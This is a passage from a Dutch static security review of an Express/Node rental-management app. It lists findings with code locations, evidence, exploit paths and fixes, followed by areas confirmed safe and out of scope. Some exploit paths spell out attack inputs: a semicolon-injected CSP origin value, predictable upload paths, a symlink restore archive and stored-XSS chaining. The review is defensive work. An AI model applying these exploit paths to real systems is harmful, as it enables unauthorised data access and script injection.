**Exploitpad:** account met alleen `view_vehicles` bladert door voorspelbare paden (`/uploads/<KENTEKEN>/fuel_receipt/…`, `/uploads/templates/…`, `/uploads/drivers/license_customer<id>_<ts>.pdf`) en downloadt klantdocumenten waar het geen rechten voor heeft. `express.static` staat directory-listing standaard uit, maar veel bestandsnamen zijn afleidbaar uit API-responses die dezelfde gebruiker wél mag zien.

**Fix:** de statische mount verwijderen en alle bestanden via de bestaande, gescopete download-routes serveren; als de mount blijft, minstens `hasPermission(MANAGE_DOCUMENTS)` toevoegen en `getUploadsDir()` gebruiken.

---

### SEC-021 — Medium — De globale input-sanitizer raakt multipart-bodies niet

**Locatie:** `server/middleware/security/sanitization.ts:41-54`, geregistreerd op `server/index.ts:181` — dus vóór `setupAuth` en vóór alle routes; multer draait pas ín de route (`server/routes.ts:170`, `:246`, `server/routes/expenses.ts:275`, enz.).

**Evidence:** `sanitizeInput` leest `req.body` op een moment dat `express.json`/`express.urlencoded` die al gevuld hebben; bij `multipart/form-data` is `req.body` op dat moment leeg en wordt hij later door multer gevuld — daarna komt er geen sanitizer meer langs.

**Exploitpad:** elke route die `upload.single(...)`/`diskStorage` gebruikt (documenten, schadecontroles, expenses-with-receipt, boetebrieven, portal-aanvragen) accepteert ongefilterde HTML in tekstvelden. In combinatie met een sink als `reports/index.tsx:1247` (`doc.body.innerHTML = content`, zie SEC-038) is dat het ontbrekende stuk voor stored XSS met `<script>`.

**Fix:** de sanitizer ook ná multer draaien (bijvoorbeeld als kleine wrapper om `upload.single`), of — beter — niet op ingress saneren maar op output escapen en de sinks repareren.

---

### SEC-022 — Low — `/health` is ongeauthenticeerd en lekt omgeving + gebruikersaantal, en doet een volledige users-query

**Locatie:** `server/index.ts:273-330`, helper `testDatabaseConnection` op `:313-330`

**Evidence:** de respons bevat `envVars: { DATABASE_URL: bool, SESSION_SECRET: bool, NODE_ENV }`, `database.userCount`, poolstatistieken en in de fouttak `error.message` van de databaselaag. `testDatabaseConnection()` roept `storage.getAllUsers()` aan — elke health-poll haalt de complete gebruikerstabel op.

**Exploitpad:** een aanvaller leest af of `SESSION_SECRET` gezet is (relevant voor SEC-018) en hoeveel accounts er zijn; een request-flood op `/health` is een goedkope DB-amplificatie (de route zit buiten `apiLimiter`, die alleen op `/api` staat, `index.ts:174`).

**Fix:** de `envVars`- en `userCount`-velden schrappen, een `SELECT 1` gebruiken in plaats van `getAllUsers()`, en de gedetailleerde variant achter authenticatie zetten.

---

### SEC-023 — Medium — `/api/documents/view|download/:id` omzeilen `resolveDocumentFilePath()`

**Locatie:** `server/routes.ts:5129-5140` en `server/routes.ts:5183-5194`

**Evidence:**
```
let absolutePath = path.join(process.cwd(), document.filePath);
if (!fs.existsSync(absolutePath)) { const altPath = path.join(process.cwd(), 'uploads', document.filePath); … }
…
res.sendFile(absolutePath, …)
```
Geen containment-check, terwijl `resolveDocumentFilePath()` (`server/services/document-paths.ts:19-47`) precies daarvoor bestaat en elders wél gebruikt wordt.

**Waarom (nu) niet exploiteerbaar:** `POST /api/documents` (`routes.ts:5027-5034`) overschrijft `filePath` met `getRelativePath(req.file.path)` ná de spread, en `PATCH /api/documents/:id` (`routes.ts:5086-5090`) staat alleen `documentType` en `notes` toe. Er is dus vandaag geen route die `documents.filePath` client-zetbaar maakt — hoewel `insertDocumentSchema` (`shared/schema.ts:1065`) het veld wel accepteert. Eén nieuwe schrijfroute of een import-pad maakt hier meteen een arbitrary read van.

**Fix:** beide routes door `resolveDocumentFilePath()` halen en `filePath` uit `insertDocumentSchema` omitten.

**Overlap:** BUG-012.

---

### SEC-024 — Medium — CSP-header-injectie via `allowedFrameOrigins` van de portal-config

**Locatie:** `server/middleware/security/headers.ts:110-125`, in het bijzonder `:114` en `:120`

**Evidence:**
```
const origins = config.allowedFrameOrigins.join(' ');
res.setHeader('Content-Security-Policy', [...withoutFrame, `frame-ancestors 'self' ${origins}`].join('; '));
res.removeHeader('X-Frame-Options');
```
De waarden komen uit de portal-config in de database (`server/services/portal-config.ts`), beheerbaar via de portal-admin-routes. Er is geen validatie op origin-syntax; een puntkomma in een waarde voegt extra CSP-directives toe.

**Exploitpad:** beheerder-met-`manage_portal` (of iemand die die rechten via SEC-010 verkrijgt) zet een "origin" als `https://a.example; script-src * 'unsafe-inline'` → de CSP van alle portal-pagina's wordt verzwakt. Een lege/te ruime lijst (`*`) haalt bovendien de clickjacking-bescherming weg omdat `X-Frame-Options` onvoorwaardelijk wordt verwijderd.

**Fix:** elke origin valideren met `new URL()` en alleen `scheme://host[:port]` doorlaten (geen pad, geen spatie, geen `;`, geen `*`); bij een lege lijst terugvallen op `frame-ancestors 'self'` zonder `X-Frame-Options` te verwijderen.

---

### SEC-025 — Medium — Socket.IO zonder authenticatie; productie-CORS-lijst is bovendien niet functioneel

**Locatie:** `server/index.ts:196-236`

**Evidence:** `io.on('connection', …)` (regel 221) doet geen enkele verificatie — geen `io.use()`-middleware, geen sessiekoppeling, geen rooms per rol. De CORS-lijst in productie (regel 199-206) bestaat uit twee Replit-env-vars (in Coolify leeg) plus de letterlijke strings `'https://*.replit.app'` en `'https://*.replit.dev'`; Socket.IO vergelijkt origins exact, dus wildcards werken hier niet en de echte deployment-origin staat er niet tussen. In development is het `"*"` met `credentials: true`.

**Exploitpad:** een niet-browserclient (curl, node) negeert CORS volledig en ontvangt alle broadcasts uit `server/realtime-events.ts` — voertuig-, klant-, reservering- en gebruikersgegevens — zonder in te loggen.

**Fix:** een `io.use()`-handshake die de express-session parseert en de verbinding weigert zonder geldige, geauthenticeerde sessie; broadcasts naar rooms per permissie sturen; de origin-lijst uit de daadwerkelijke deployment-URL afleiden.

**Overlap:** BUG-005.

---

### SEC-026 — Low — scrypt met Node-standaardparameters

**Locatie:** `server/auth.ts:33-38` (`hashPassword`) en `:40-51` (`comparePasswords`)

**Evidence:** `scryptAsync(password, salt, 64)` zonder options-object → Node-defaults `N=16384, r=8, p=1` (16 MB). OWASP adviseert voor scrypt minimaal `N=2^17`. Salt is 16 random bytes, keylength 64, vergelijking via `timingSafeEqual` — dat deel is correct. Bij een afwijkende hashlengte gooit `timingSafeEqual` en vangt de `catch` dat af naar `false` (regel 47-50), dus geen crash.

**Fix:** expliciet `{ N: 1 << 17, r: 8, p: 1, maxmem: … }` meegeven en een migratiepad voorzien (kostparameters in de hash-string opslaan, herhashen bij succesvolle login).

---

### SEC-027 — Low — Uitloggen ruimt de `active_sessions`-rij niet op

**Locatie:** `server/auth.ts:377-398` (`POST /api/logout`), tegenover `server/utils/security/sessionManager.ts:9-50` (`trackSession`, aangeroepen bij login op `auth.ts:356`)

**Evidence:** `req.logout()` (passport 0.7) regenereert de sessie, maar er is geen `removeSession(req.sessionID)`-aanroep; de rij in `active_sessions` blijft staan tot de uurlijkse `cleanExpiredSessions()` (`server/index.ts:456`) hem op `expiresAt` opruimt — en `expiresAt` wordt bij login op **30 dagen** gezet (`auth.ts:355`), terwijl de sessiecookie 15 minuten leeft (`auth.ts:114`).

**Exploitpad:** het beheerdersoverzicht van actieve sessies toont maandenlang spooksessies, waardoor een echte, verdachte sessie niet opvalt. Geen directe authenticatiebypass — de daadwerkelijke autorisatie hangt aan de express-session-store, niet aan deze tabel.

**Fix:** bij logout de rij verwijderen en `expiresAt` gelijktrekken met de cookie-`maxAge`.

---

### SEC-028 — Low — CSRF-tokenvergelijking niet constant-time; anonieme bezoekers krijgen een sessie

**Locatie:** `server/middleware/security/csrf.ts:54` (`return hash === expectedHash;`) en `:100-113` (`attachCsrfToken`)

**Evidence:** het ontwerp zelf is correct: het token is `timestamp.HMAC(sessionSecret, timestamp)`, dus aan de sessie gebonden (geen naïef double-submit) met een TTL van 24 uur. De vergelijking is echter een gewone string-vergelijking in plaats van `crypto.timingSafeEqual`. Daarnaast maakt `generateCsrfToken` (`:16-18`) bij **elke** request een `csrfSecret` in de sessie aan, ook voor niet-ingelogde bezoekers; met `saveUninitialized: false` betekent dat toch een rij in de `session`-tabel per bezoeker, en het geeft een aanvaller een geldig token voor ongeauthenticeerde routes (relevant voor SEC-001).

`/api/login` is de enige exempt-path (`:119`); voor het portaal zijn dat `/api/portal/login|forgot|activate|email/confirm` (`server/portal-auth.ts:181`) — alle vier pre-auth, dus verdedigbaar.

**Fix:** `timingSafeEqual` op buffers van gelijke lengte; het CSRF-secret pas aanmaken zodra er een geauthenticeerde sessie is, of de sessie-rij voor anonieme bezoekers periodiek opruimen.

---

### SEC-029 — Info — drizzle-orm 0.39.3: `sql.identifier` escapet geen dubbele quotes (advisory), maar geen enkele identifier komt van de gebruiker

**Locatie:** `node_modules/drizzle-orm/pg-core/dialect.js:73-75` — `escapeName(name) { return \`"${name}"\`; }` (geen `"` → `""`-verdubbeling); gebruik in `server/database-storage.ts:3877`, `:3883`, `:4001`, `:4008`.

**Waarom niet exploiteerbaar:** in `executeReport()` wordt elke tabel/kolom eerst gevalideerd:
- de tabel via de whitelist `reportTables` (`database-storage.ts:3839-3845`) en `getDataSource()` (`:3847`);
- elk veld via `getReportField(table, field)` en vervolgens `tableObj[field].name` (`database-storage.ts:3861-3874`) — de uiteindelijke string komt dus uit het Drizzle-schema, niet uit de request;
- de alias `sql.identifier(String(col.field))` (`:3883`) wordt pas bereikt nadat `identFor()` op regel 3882 al gegooid heeft voor een onbekend veld;
- operators worden per veld gevalideerd tegen `def.operators` (`:3921-3925`) en álle waarden gaan als gebonden parameters mee (`:3931-3999`).

Verder is er in de hele codebase geen `sort`/`order`/`column`-queryparameter die in SQL terechtkomt (`server/routes/reports.ts`, `server/routes/filtered-vehicles.ts` en de zoek-endpoints filteren in JS of via `ilike()` met gebonden parameters, o.a. `database-storage.ts:106-111`).

**Fix:** upgraden naar een drizzle-versie waarin de advisory verholpen is, als hygiëne — er is geen exploiteerbaar pad.

---

### SEC-030 — Info — `startup-migration.js` bouwt DDL met string-concatenatie uit een build-manifest

**Locatie:** `startup-migration.js:53`, `:75`, `:81`, `:215-217` (`quoteIdent`), `:268-283`, `:300-313`

**Evidence:** `quoteIdent(name)` doet `\`"${name}"\`` zonder `"`-verdubbeling, en `col.type` / `col.default` worden onbewerkt in de DDL geïnterpoleerd (`DEFAULT ${col.default}`).

**Waarom niet exploiteerbaar:** de bron is `schema-columns.json`, gegenereerd door `scripts/export-schema.ts` als eerste stap van `npm run build` (zie de comment op `startup-migration.js:220-223`) uit `shared/schema.ts`. Er is geen runtime-invoer. Wel een supply-chain-oppervlak: wie het manifest of `shared/schema.ts` kan wijzigen, voert bij de volgende boot willekeurige SQL uit als DB-owner — en dat is precies wat SEC-004 (overschrijven van `/app`) mogelijk maakt.

**Fix:** identifiers escapen met verdubbelde quotes, `col.type` valideren tegen een lijst van toegestane types, en het manifest bij de start controleren tegen een checksum die bij de build vastligt.

---

### SEC-031 — Low — De filenamefilter van de backup-routes mist de backslash

**Locatie:** `server/routes/backups.ts:585-587`, `:672-674`, `:719-721`

**Evidence:** `if (filename.includes('..') || filename.includes('/'))` — `\` wordt niet geblokkeerd. Op Linux (de deploy) is `\` geen separator, dus geen impact; bij een Windows-run wél. `path.basename()` wordt niet gebruikt. De `Content-Disposition`-header krijgt de rauwe filename (`:576`, `:685`), maar Node weigert zelf CR/LF in headerwaarden, dus header-injectie is uitgesloten.

**Fix:** `path.basename(filename)` gebruiken en daarna vergelijken met het origineel, in plaats van een blacklist.

---

### SEC-032 — Low — `resolveDocumentFilePath()` volgt symlinks

**Locatie:** `server/services/document-paths.ts:33-41`

**Evidence:** de containment-check gebruikt `path.resolve()` plus `startsWith(uploadsResolved + path.sep)`. Dat is correct tegen `../`-traversal (`..` is na `resolve()` weg) en tegen Windows-driveletters (een absoluut pad buiten uploads valt af). Er wordt echter geen `fs.realpathSync()` gedaan, dus een **symlink binnen** `uploads/` die naar buiten wijst wordt gevolgd.

**Exploitpad:** ketent op SEC-004 — een restore-archief dat `uploads/leak -> /` bevat maakt daarna elk bestand leesbaar via de nette, gescopete download-routes (`server/routes/portal.ts:193`, `server/routes/fines.ts:243`).

**Fix:** na `path.resolve()` ook `fs.realpathSync()` toepassen en de containment op het gerealiseerde pad controleren.

---

### SEC-033 — Low — Geen time-out op de uitgaande geocoding-/routing-requests

**Locatie:** `server/geocoding.ts:36` (Nominatim) en `server/geocoding.ts:118` (OSRM)

**Evidence:** beide `fetch()`-aanroepen hebben geen `AbortSignal`/time-out, in tegenstelling tot `server/utils/rdw-api.ts:140-148` (5 s via `AbortController`). Aanroepers: `server/routes.ts:7529-7545` en `:7598-7619`.

**Exploitpad:** een trage of hangende upstream houdt request-handlers en pool-connecties bezig; een gebruiker met `manage_reservations` kan met veel `stops` in `POST /api/delivery/optimize-route` een grote serie hangende calls veroorzaken.

**Fix:** een `AbortController` met 5-10 s en een maximum op het aantal stops per request.

---

### SEC-034 — Info — Dependency-advisories versus daadwerkelijk gebruik

| Package | Versie | Gebruikt waar | Oordeel |
|---|---|---|---|
| `tar` | 7.4.3 | **nergens geïmporteerd** (alleen systeem-`tar` via `exec`/`spawn`) | node-tar-advisories n.v.t.; risico zit in SEC-004 |
| `fast-xml-parser` | 5.11.1 | `server/services/cjib/parser.ts:7`, `:116` | XXE geblokkeerd (`node_modules/fast-xml-parser/src/xmlparser/DocTypeReader.js:132-136` gooit op `SYSTEM`), billion-laughs begrensd door `maxEntitySize`/`maxTotalExpansions`; wél ongebounde recursie in `parser.ts:108-113` (zie SEC-036) |
| `express-rate-limit` | 8.1.0 | `server/middleware/security/rateLimiter.ts:12`, `:28` | geen custom `keyGenerator`; default `req.ip` met `trust proxy: 1` is correct. Wel `skip` voor élke geauthenticeerde gebruiker (`:18-22`), dus ingelogde accounts hebben geen enkele rate limit |
| `lodash` | — | niet aanwezig | `_.template`/`_.unset`-advisories n.v.t. |
| `nodemailer` | 7.0.6 | `server/utils/email-service.ts` | zie SEC-015/SEC-016 |
| `multer` | 1.4.5-lts.2 | overal | 1.x is end-of-life; bekende DoS-advisories (onvolledige multipart, veel velden). Migratie naar 2.x aanbevolen |
| `xlsx` | 0.18.5 | alléén client-side, `client/src/components/vehicles/vehicle-bulk-import-dialog.tsx:34` | prototype-pollution/ReDoS-advisories draaien in de browser van de uploader zelf; geen server-impact |
| `openai` | 5.22.0 | nergens geïmporteerd | dode dependency, verwijderen |
| `csurf` | 1.11.0 | nergens gebruikt (eigen CSRF in `middleware/security/csrf.ts`) | deprecated dependency, verwijderen |
| `form-data`, `ip-address` | transitief | — | niet direct aangeroepen vanuit app-code |

---

### SEC-035 — Low — `fromName`/`fromEmail` worden rauw in een mailheader geïnterpoleerd

**Locatie:** `server/utils/email-service.ts:276` — `from: \`"${config.fromName}" <${config.fromEmail}>\``, waarden uit de `email`-categorie van `app_settings` (`email-service.ts:97-105`), schrijfbaar via `POST /api/app-settings` (`server/routes/app-settings.ts:333`, `MANAGE_SETTINGS`).

**Evidence:** geen escaping van `"`, `<`, `>` of CR/LF. Nodemailer normaliseert het meeste, maar de concatenatie zelf is het zwakke punt.

**Fix:** `from: { name, address }` als object doorgeven in plaats van een geconcateneerde string, en beide velden valideren.

---

### SEC-036 — Low — Ongebounde recursie bij het parsen van CJIB-XML

**Locatie:** `server/services/cjib/parser.ts:108-113` (`collectRecordNodes`), bereikbaar via `POST /api/fines/imports/upload` (`server/routes/fines.ts:89-95`, `canManage`, memory-storage, 20 MB).

**Evidence:** de recursieve boomwandeling heeft geen dieptelimiet; 20 MB diep genest XML kan de call stack uitputten. `server/index.ts:126-134` vangt `uncaughtException` af met een **graceful shutdown**, dus een stack overflow zet het proces stil.

**Fix:** een dieptelimiet in `collectRecordNodes` en de uploadlimiet voor XML verlagen.

---

### SEC-037 — Info — `SESSION_SECRET` ontbreekt in productie faalt niet hard

**Locatie:** `server/auth.ts:67-85`

**Evidence:** zonder `SESSION_SECRET` wordt in productie alleen `console.error` gelogd en draait de app door met een willekeurig secret per proces. Dat is veiliger dan een vast secret (vergelijk SEC-018), maar het maakt sessies onbruikbaar over herstarts en replicas heen — wat zich presenteert als "login werkt, daarna 401", precies zoals de comment beschrijft.

**Fix:** in productie `process.exit(1)`.

---

### SEC-038 — Low — `innerHTML` in de print-/rapportbouwer van de client

**Locatie:** `client/src/pages/reports/index.tsx:1247` (`doc.body.innerHTML = content`), met servergegevens op `:614`, `:868`, `:962-963`, `:1033`, `:1121`, `:1137`, `:1218`, `:1225-1232`; en `:659` (`doc.head.innerHTML`, alleen i18n-strings — niet aanvaller-gestuurd).

**Evidence:** merk, model, categorie, omschrijving, klantnaam en transportvelden worden rauw als `${}` in `<td>`-elementen gezet. Dit is element-content-context, dus een payload heeft `<` nodig — wat de globale server-side tag-stripper (`sanitization.ts:12`) vandaag wegneemt.

**Waarom (nu) niet exploiteerbaar:** afhankelijk van precies één ingress-filter. Zodra de data via een multipart-route binnenkomt (SEC-021), via de CSV-/plaat-bulkimport, via de CJIB-importer of via een directe DB-schrijfactie, is het wél een XSS in de print-iframe op de app-origin.

**Fix:** de tabel opbouwen met `createElement`/`textContent` (het patroon uit `client/src/components/barcodes/key-label-print.ts:139`) of elke waarde HTML-escapen.

---

### SEC-039 — Info — Repo-/build-hygiëne rond secrets

**Locatie / evidence:**
- `git ls-files` toont `.env.coolify`, `.env.sample` en `cookies.txt` als getrackt. `.env.coolify` bevat **uitsluitend placeholders** (`your_db_password`, `your_session_secret`) — geen echte credentials. `cookies.txt` bevat alleen de libcurl-header, geen cookies. `.env` zelf staat in `.gitignore` en `.dockerignore` en is niet getrackt.
- `nixpacks.toml:3` — `NPM_CONFIG_PRODUCTION = "false"` → devDependencies (vitest, drizzle-kit, esbuild, tsx) belanden in het draaiende Coolify-image; groter aanvalsoppervlak dan de Dockerfile-route (`Dockerfile:36`, `npm ci --omit=dev`).
- `Dockerfile:14` — `COPY . .` in de builder-stage; `.dockerignore` sluit `.env` en `.env.local` uit, maar **niet** `.env.coolify`, `backups/`, `temp/` of `uploads/`. Die belanden in de builder-laag (niet in de runtime-image, want die kopieert alleen `dist/` + specifieke bestanden — behalve `uploads/`, dat op `Dockerfile:47` wél mee wordt gekopieerd).
- `drizzle.config.ts` leest `DATABASE_URL` uit env; geen hardcoded credentials.
- `.env.sample` bevat alleen placeholders.

**Fix:** `cookies.txt` uit de repo halen; `.dockerignore` uitbreiden met `.env*`, `uploads`, `backups`, `temp`, `docs`; `NPM_CONFIG_PRODUCTION` heroverwegen of de build naar de Dockerfile-route trekken.

---

## Confirmed OK

Onderzocht en in orde bevonden — met vindplaats, zodat een volgende review dit niet hoeft over te doen.

**SQL-injectie — geen enkel exploiteerbaar pad gevonden.**
- Alle `sql.raw(`-aanroepen geïnventariseerd: `server/database-storage.ts:713` (tabelnaam uit een hardgecodeerde array op `:705-709`), `startup-migration.js:53`, `:75`, `:81`, `:283`, `:313` (build-manifest, zie SEC-030). Geen daarvan raakt request-data.
- De rapportbouwer `executeReport()` (`server/database-storage.ts:3828-4016`) valideert tabel, veld, aggregatie en operator tegen whitelists en bindt alle waarden — zie SEC-029 voor de volledige redenering.
- `server/routes/reports.ts` rekent volledig in JavaScript op reeds opgehaalde rijen (`:41-42`, `:65`, `:71-73`); `parseReportRange` (`:13-19`) dwingt `^\d{4}-\d{2}-\d{2}$` af.
- `server/routes/filtered-vehicles.ts:22-37` gebruikt uitsluitend Drizzle-builders (`eq`, `lte`, `gte`, `isNotNull`); `filterType` stuurt alleen JS-filters aan (`:52`).
- Zoeken in de activity log: `server/database-storage.ts:106-111` — `ilike()` met gebonden parameters, en de één rauwe `sql`-fragment (`${auditLogs.details}::text ILIKE ${term}`) bindt `term` als parameter.
- Er is nergens een `sort`/`order`/`direction`-queryparameter die als identifier in SQL landt.

**Command injection — de gevaarlijke argumenten zijn niet aanvaller-gestuurd.**
- `server/backupService.ts:239`, `:763`, `:798`, `:930` gebruiken `spawn()` met een argument-array (geen shell) — quoting is daar niet relevant.
- De `exec()`-aanroepen in `server/routes/backups.ts:94`, `:143`, `:280`, `:282`, `:354`, `:421`, `:428`, `:485` interpoleren `process.cwd()`, `process.env.DATABASE_URL`, en `req.file.path`/`filepath`. `req.file.path` komt van multer met `dest:` (`server/routes.ts:143-149`), dus een door multer gegenereerde hex-naam zonder shell-metatekens — géén command injection. `DATABASE_URL` is operator-gestuurd. Het risico van deze routes is de *extractie* (SEC-004), niet de quoting.
- `server/utils/pdf-to-image.ts` gebruikt `pdfjs-dist` + `canvas`, geen `child_process` (regel 1-8).
- Buiten `backupService.ts`, `server/routes/backups.ts` en `scripts/init-db.js` (buiten runtime) is er geen `child_process`-gebruik.

**Portal-autorisatie en -tokens.**
- Elke portal-query is per klant gescoped: `server/routes/portal.ts:95`, `:102`, `:118`, `:144`, `:161`, `:196`, `:209`, `:215`, `:223`, `:246`, `:251`, `:262`, `:280`, `:292`, `:428`, `:441`, `:459`, `:477` geven allemaal `ctx.customerId` (+ `ctx.scope` voor driver-accounts) mee aan de storage-laag. Er is geen route die een `customerId` uit de request accepteert.
- Uitnodigings-/reset-tokens: `server/services/portal-tokens.ts:10-13` — `randomBytes(32)`, alleen de SHA-256-hash wordt opgeslagen, TTL 72 uur (`:3`); lookup gaat op de hash (`server/portal-auth.ts:378`, `:325`). Tokenformaat wordt strikt gevalideerd (`^[0-9a-f]{64}$`, `:322`, `:377`).
- Portal-login: sessie-regeneratie vóór `req.login` (`server/portal-auth.ts:255-257`), lockout per e-mailadres (`:238-240`), `forgot` antwoordt altijd 200 (`:365-374`), logout doet `session.destroy()` + `clearCookie` (`:270-278`), wachtwoordwijziging vereist het huidige wachtwoord (`:361-364`), e-mailwijziging bevestigt via het nieuwe adres (`:298-312`).
- `requireFeature`/`requirePortalRole` (`server/portal-auth.ts:139-153`) worden consequent toegepast op de features die daarom vragen.

**Preview-tokens.** `server/preview-token-service.ts:20-22` — `crypto.randomBytes(32)`; `get()` controleert TTL (30 min, `:46-49`) én eigenaarschap (`:52-55`); opslag in-memory met periodieke opruiming (`:76-78`).

**Staff-sessiebeheer.** Sessiecookie `httpOnly: true`, `sameSite: 'strict'`, `maxAge` 15 min met `rolling: true` (`server/auth.ts:113-118`); `secure: 'auto'` gecombineerd met `trust proxy: 1` (`server/auth.ts:135`, `server/utils/secure-cookies.ts:17-29`) is de juiste keuze achter een TLS-terminerende proxy. Sessie-regeneratie bij login (`server/auth.ts:332`). `comparePasswords` gebruikt `timingSafeEqual` (`:46`).

**CSRF-ontwerp.** Het token is aan het sessiegeheim gebonden via HMAC (`server/middleware/security/csrf.ts:22-28`, `:49-54`), niet een naïef double-submit-cookie; de middleware staat vóór alle routes inclusief `/api/login` en `/api/register` (`server/auth.ts:153-154`, met de motivatie in de comment op `:147-152`); exempt-paths zijn beperkt tot pre-auth-routes (`:119`, `server/portal-auth.ts:181`). Zie SEC-028 voor de twee kleine punten.

**Documentpad-resolutie waar hij wél gebruikt wordt.** `resolveDocumentFilePath()` (`server/services/document-paths.ts:19-47`) is correct tegen `../` en absolute paden buiten uploads; toegepast in `server/routes/fines.ts:243`, `server/routes/portal.ts:197`, `:224`, `:284`, `:294`.

**RDW-proxy is geen SSRF.** `server/utils/rdw-api.ts:140` strip het kenteken met `replace(/[^a-zA-Z0-9]/g, '')` vóór interpolatie in een hardgecodeerde URL, met 5 s time-out (`:148`) en veld-voor-veld mapping van de respons. (Dat de route ongeauthenticeerd is, blijft BUG-046.)

**Geocoding is geen SSRF.** `server/geocoding.ts:35-36` gebruikt `encodeURIComponent` in een query-parameter achter een vaste host; `server/geocoding.ts:105-118` interpoleert wel in een pad-segment, maar de waarden komen uitsluitend uit `parseFloat()` (`:51`) — nooit rechtstreeks uit `req.body`. Zie SEC-033 voor het resterende punt.

**Gemini-scanners.** `server/utils/invoice-scanner.ts:13` en `server/utils/fine-scanner.ts:85-95` gebruiken de SDK-default-endpoint met een modelnaam uit een vaste lijst; gebruikersinhoud komt alleen als `inlineData` binnen. Geen URL-invloed.

**Object storage.** `server/objectStorage.ts:5-15` — sidecar-URL's `http://127.0.0.1:1106/...` zijn constanten; bucket-/objectnamen komen uit env-vars, niet uit requests. (Dat `/object-storage/*` ongeauthenticeerd is, blijft BUG-051.)

**Geen `dangerouslySetInnerHTML` in de hele client.** Bevestigd met een volledige grep over `client/src`. Ook geen `outerHTML`, `insertAdjacentHTML`, `createContextualFragment`, `eval(`, `new Function(`, `srcdoc` of `setTimeout` met een string-argument. Alle acht iframes hebben een veilige `src`: vaste API-paden (`client/src/pages/delivery/dashboard.tsx:992`, `client/src/pages/documents/index.tsx:1208`, `client/src/pages/reservations/calendar.tsx:3042`, `client/src/components/maintenance/maintenance-view-dialog.tsx:916`), een `blob:`-URL, of een server-samengestelde Google-Maps-embed. `PdfPreviewDialog` krijgt in alle aanroepen een letterlijk API-template mee.

**Rechten-middleware zelf.** `hasPermission` (`server/middleware/permissions.ts:6-31`) faalt gesloten bij een ontbrekende `req.user` en gebruikt OR-logica zoals bedoeld; `requireAdmin` (`:34-44`) controleert eerst `isAuthenticated()`.

**Restore-veiligheidsnetten.** `POST /api/backups/restore-data` maakt en verifieert eerst een veiligheidsback-up (`server/routes/backups.ts:251`), controleert de gzip-magic en decomprimeert vóór het droppen (`:200-215`), en weigert alles dat niet op een PostgreSQL-dump lijkt (`:217-244`). De destructieve restores vragen om een letterlijke bevestiging van de bestandsnaam (`:851-857`, `:933-939`). `restoreFiles` accepteert bewust geen `targetPath` uit de body (`:894-903`).

---

## Not reviewed

- **Dynamisch gedrag.** Er is niets uitgevoerd: geen requests, geen `npm audit`, geen lockfile-resolutie van transitieve advisories. Alle exploitpaden zijn statisch afgeleid en moeten in een testomgeving worden bevestigd voordat er een CVSS-score aan hangt.
- **`server/routes.ts` regel voor regel.** Het bestand is 7.758 regels; ik heb het doorzocht op de patronen uit de opdracht (auth-guards, `req.body`-spreads, file-operaties, `exec`, `fetch`) en de treffers gelezen. Individuele businesslogica in de reserverings-, transport- en damage-check-handlers is niet volledig doorgelopen.
- **Autorisatie-diepte per rol.** Ik heb vastgesteld wélke permissie elke route eist, maar niet welke permissies in de praktijk aan welke rollen worden toegekend (`shared/schema.ts` `UserPermission` versus de UI). Of `manage_fines`/`manage_settings`/`manage_backups` in deze organisatie ruim of krap uitgedeeld worden, bepaalt de reële severity van SEC-005, -006, -007, -011 en -014.
- **`client/src` buiten de XSS-sinks.** Geen review van client-side autorisatielogica, van tokens in `localStorage`/`sessionStorage`, of van de query-cache.
- **Race conditions en TOCTOU** (bijvoorbeeld tussen `listBackups()` en `restoreDatabase()`, of de contractnummer-uniciteitscheck op `server/routes.ts:3580-3596`).
- **Cryptografische review van de PDF-generatie** (`server/utils/pdf-generator.ts`, `server/pdf-damage-check-generator.ts`) en van `server/backupVerification.ts`.
- **Infrastructuur.** Coolify-configuratie, Traefik-headers, netwerksegmentatie, databaserechten van de app-user, volume-permissies en logretentie zijn buiten scope van een statische code-review — maar bepalen wel of SEC-006/SEC-007 (interne portscan) daadwerkelijk iets interessants bereiken.
- **`scripts/`** (buiten `startup-migration.js`) en de testsuite in `server/__tests__`.
